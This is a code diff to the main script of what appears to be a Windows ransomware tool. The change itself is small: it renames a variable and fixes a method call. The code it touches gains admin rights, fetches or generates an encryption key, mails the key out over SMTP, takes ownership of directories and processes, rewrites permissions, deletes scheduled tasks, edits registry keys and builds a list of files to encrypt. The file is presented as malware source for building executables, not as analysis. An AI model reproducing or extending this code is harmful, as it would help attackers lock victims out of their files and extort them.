@@ -7,20 +7,25 @@ from modules.permission import takeown, icacls, get_admin_rights
 from modules.system import delproc, regedit
 from modules.network import host_connect, sendkey_smtp, keyserver
 import os, sys, socket, wget, struct, ctypes, shutil, winreg, time
+
+""" THIS FILE IS PART OF THE FINAL EXECUTABLES """
+
 # ENVIRONMENT VARIABLE
-usr = os.environ["USERNAME"]
+current_user = os.environ["USERNAME"]
+
 # INIT VARIABLE TO CALL THE FUNCTION INTO THE CLASS
 gt = takeown.GetOwn()
 gr = icacls.GetPermission()
 dr = delproc.Remove()
 dk = delproc.Kill()
 rkey = regedit.ManageKey()
+
 # MAIN CODE
 if(get_admin_rights.is_admin()):
     if host_connect.keyrcv():
         keyserver.getcrypt()
     else:
-        crypt.genkey(usr)
+        crypt.genkey(current_user)
         sendkey_smtp.send_key()
         gt.proc()
         gr.proc()
@@ -28,7 +33,7 @@ if(get_admin_rights.is_admin()):
         dr.stsk()
         rkey.setkey()
         rkey.delkey()
-        regedit.setInit()
+        rkey.setInit()
         gt.dir()
         gr.dir()
         crypt.filelist()
